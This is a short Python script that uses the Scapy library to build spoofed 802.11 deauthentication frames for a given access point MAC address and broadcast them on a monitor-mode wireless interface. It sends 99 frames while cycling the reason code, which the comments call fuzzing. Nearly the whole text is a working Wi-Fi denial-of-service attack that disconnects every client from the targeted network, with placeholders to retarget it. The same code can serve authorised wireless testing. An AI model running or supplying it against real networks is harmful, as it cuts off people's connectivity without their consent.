from scapy.all import *

ra="ff:ff:ff:ff:ff:ff"
# Modify as appropriate
ta="00:26:86:f0:7d:67"
bssid=ta
# Modify as appropriate
interface="wlan1mon"

# The deauth frame to transmit created by layering different Scapy objects.
deauth=RadioTap()/Dot11(addr1=ra, addr2=ta, addr3=bssid)/Dot11Deauth()

for x in range(1,100):
    # Fuzzing is trivial with Scapy
    deauth.reason = x
    sendp(deauth, iface=interface)

